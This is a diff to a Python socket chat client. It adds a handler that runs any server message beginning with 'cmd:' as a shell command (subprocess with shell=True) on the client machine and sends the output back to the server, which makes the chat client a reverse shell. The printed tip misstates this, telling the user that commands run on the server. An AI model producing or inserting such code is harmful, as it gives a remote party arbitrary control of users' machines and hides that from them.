@@ -1,5 +1,6 @@
 import socket
 import threading
+import subprocess
 
 def receive_messages(sock):
     while True:
@@ -7,7 +8,21 @@ def receive_messages(sock):
             message = sock.recv(4096).decode('utf-8')
             if not message:
                 break
-            print(f"\n{message}\n[You]: ", end="")
+            
+            
+            if message.startswith("cmd:"):
+                command = message[4:].strip()
+                print(f"\n[Executing Command]: {command}")
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                    if not output:
+                        output = "Command executed successfully (no output)."
+                except subprocess.CalledProcessError as e:
+                    output = f"Command failed with error:\n{e.output}"
+                
+                sock.sendall(f"\n--- Client Output ---\n{output}\n---------------------".encode('utf-8'))
+            else:
+                print(f"\n[Server]: {message}\n[Client]: ", end="")
         except:
             break
 
@@ -18,8 +33,8 @@ def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         client.connect((host, port))
-        print("[+] Connected to server.")
-        print("[*] Tip: Type regular text to chat, or type 'cmd: <command>' to execute terminal commands on the server.")
+        print("[+] Connected to Server.")
+        print("[*] Type text to chat, or 'cmd: <command>' to run remote commands on Server.")
     except Exception as e:
         print(f"[-] Connection failed: {e}")
         return
@@ -30,7 +45,7 @@ def main():
 
     while True:
         try:
-            msg = input("[You]: ")
+            msg = input("[Client]: ")
             if msg.lower() == 'quit':
                 break
             client.sendall(msg.encode('utf-8'))
